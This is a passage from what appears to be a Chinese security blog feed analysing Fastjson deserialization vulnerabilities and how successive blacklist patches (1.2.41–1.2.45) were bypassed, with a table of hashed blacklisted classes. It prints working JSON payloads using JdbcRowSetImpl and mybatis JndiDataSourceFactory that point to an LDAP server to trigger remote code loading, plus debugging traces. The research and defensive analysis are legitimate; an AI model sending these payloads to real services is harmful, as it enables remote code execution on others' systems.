TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p><p>运行会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p><p>1.2.48版本：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/10.png" alt=""></p><p>1.2.47版本：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/13.png" alt=""></p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/14.png" alt=""></p><p>导致目标类并不能缓存到Map中了：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/11.png" alt=""></p><p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/12.png" alt=""></p><hr><p>OK，19年的Fastjson反序列化漏洞就分析到这，后面是Fastjson系列的最后一篇了，说下检测与防御方法、高版本JDK绕过等等。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列三——历史版本补丁绕过（需开启AutoType）</title>
    <link href="https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/</id>
    <published>2019-11-10T04:07:43.000Z</published>
    <updated>2019-11-10T15:33:00.174Z</updated>
    
    <content type="html"><![CDATA[<p>在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p><p>网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。</p><p>注意：<strong>本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功</strong>。</p><h2 id="0x01-哈希黑名单"><a href="#0x01-哈希黑名单" class="headerlink" title="0x01 哈希黑名单"></a>0x01 哈希黑名单</h2><p>通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。</p><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>目前已知的哈希黑名单的对应表如下：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr></tbody></table><p>目前未知的哈希黑名单：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td></td></tr><tr><td>1.2.62</td><td>-5472097725414717105</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td></td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td></td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td></td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td></tr></tbody></table><h2 id="0x02-1-2-25-1-2-41补丁绕过"><a href="#0x02-1-2-25-1-2-41补丁绕过" class="headerlink" title="0x02 1.2.25-1.2.41补丁绕过"></a>0x02 1.2.25-1.2.41补丁绕过</h2><h3 id="绕过利用"><a href="#绕过利用" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>本地fastjson用的是1.2.41版本。</p><p>这里Demo还是用的<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>中基于JdbcRowSetImpl的利用链的PoC。</p><p>直接运行的话会报错，原因就是checkAutoType()函数中的黑名单过滤了”com.sun.”：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/1.png" alt=""></p><p>下面我们直接给出payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>关键PoC为：<code>Lcom.sun.rowset.JdbcRowSetImpl;</code></p><p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/2.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。</p><p>下面我们调试分析看看为啥会绕过。</p><p>我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验，再往下开始调用TypeUtils.loadClass()：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/3.png" alt=""></p><p>跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/4.png" alt=""></p><h2 id="0x03-1-2-25-1-2-42补丁绕过"><a href="#0x03-1-2-25-1-2-42补丁绕过" class="headerlink" title="0x03 1.2.25-1.2.42补丁绕过"></a>0x03 1.2.25-1.2.42补丁绕过</h2><h3 id="绕过利用-1"><a href="#绕过利用-1" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>先直接给出payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>关键PoC为：<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p><p>在1.2.22-1.2.42版本运行都能成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/5.png" alt=""></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;-<span class="number">8720046426850100497L</span>,-<span class="number">8109300701639721088L</span>,-<span class="number">7966123100503199569L</span>,-<span class="number">7766605818834748097L</span>,-<span class="number">6835437086156813536L</span>,-<span class="number">4837536971810737970L</span>,-<span class="number">4082057040235125754L</span>,-<span class="number">2364987994247679115L</span>,-<span class="number">1872417015366588117L</span>,-<span class="number">254670111376247151L</span>,-<span class="number">190281065685395680L</span>,<span class="number">33238344207745342L</span>,<span class="number">313864100207897507L</span>,<span class="number">1203232727967308606L</span>,<span class="number">1502845958873959152L</span>,<span class="number">3547627781654598988L</span>,<span class="number">3730752432285826863L</span>,<span class="number">3794316665763266033L</span>,<span class="number">4147696707147271408L</span>,<span class="number">5347909877633654828L</span>,<span class="number">5450448828334921485L</span>,<span class="number">5751393439502795295L</span>,<span class="number">5944107969236155580L</span>,<span class="number">6742705432718011780L</span>,<span class="number">7179336928365889465L</span>,<span class="number">7442624256860549330L</span>,<span class="number">8838294710098435315L</span>&#125;;</span><br></pre></td></tr></table></figure><p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/6.png" alt=""></p><p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p><p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p><p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/7.png" alt=""></p><p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/8.png" alt=""></p><h2 id="0x04-1-2-25-1-2-43补丁绕过"><a href="#0x04-1-2-25-1-2-43补丁绕过" class="headerlink" title="0x04 1.2.25-1.2.43补丁绕过"></a>0x04 1.2.25-1.2.43补丁绕过</h2><h3 id="绕过利用-2"><a href="#绕过利用-2" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>直接给出payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"[com.sun.rowset.JdbcRowSetImpl"[&#123;,"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true&#125;</span><br></pre></td></tr></table></figure><p>关键PoC：<code>[com.sun.rowset.JdbcRowSetImpl</code></p><p>但是如果我们一开始payload直接这样写是会报错的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &apos;[&apos;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>因此改下payload，在第一个逗号前面加个”[“：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43</span><br></pre></td></tr></table></figure><p>因此就修改得到最终版payload，能够成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/9.png" alt=""></p><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>调试发现，在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/10.png" alt=""></p><p>但是以”[“开头的类名自然能成功绕过上述校验以及黑名单过滤。</p><p>继续往下调试，在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/11.png" alt=""></p><p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/12.png" alt=""></p><p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/13.png" alt=""></p><p>把这些条件一一满足后，就能成功利用了。</p><h2 id="0x05-1-2-25-1-2-45补丁绕过"><a href="#0x05-1-2-25-1-2-45补丁绕过" class="headerlink" title="0x05 1.2.25-1.2.45补丁绕过"></a>0x05 1.2.25-1.2.45补丁绕过</h2><h3 id="绕过利用-3"><a href="#绕过利用-3" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>直接给出payload，要连LDAP或RMI都可以：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="attr">"properties"</span>:&#123;<span class="attr">"data_source"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p><p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中可以看到：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr></tbody></table><p>运行即可成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/14.png" alt=""></p><h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>调试checkAutoType()函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/15.png" alt=""></p><p>后面由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。</p><p>继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。</p><p>由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。</p><p>直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/16.png" alt=""></p><p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:10, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:57, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:526, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:383, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:188, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1086, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:411, InitialContext (javax.naming)</span><br><span class="line">setProperties:56, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span 